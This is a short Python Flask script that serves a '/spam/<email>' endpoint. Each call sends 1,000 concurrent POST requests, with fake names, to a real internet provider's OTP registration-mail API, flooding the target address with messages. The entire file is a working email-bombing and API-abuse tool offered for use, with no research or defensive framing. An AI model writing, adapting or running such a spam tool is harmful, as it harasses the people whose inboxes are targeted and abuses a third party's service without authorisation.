
from flask import Flask, request, jsonify
from concurrent.futures import ThreadPoolExecutor
from faker import Faker
import requests

app = Flask(__name__)
fake = Faker()
url = "https://api.biznetnetworks.com/portalhome/otpHomeRegistMail"

@app.route('/spam/<email>', methods=['GET'])
def send_request(email):
    def single_request():
        fake_name = fake.name()
        payload = {"email": email, "name": fake_name, "phone": "089512516224"}
        headers = {
            "Host": "api.biznetnetworks.com",
            "Content-Type": "application/json",
        }

        response = requests.post(url, json=payload, headers=headers)
        if response.status_code == 200:
            return "Sukses"

    with ThreadPoolExecutor(max_workers=20000) as executor:
        futures = [executor.submit(single_request) for _ in range(1000)]

    results = [future.result() for future in futures if future.result() is not None]
    return jsonify({"results": "Sukses"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
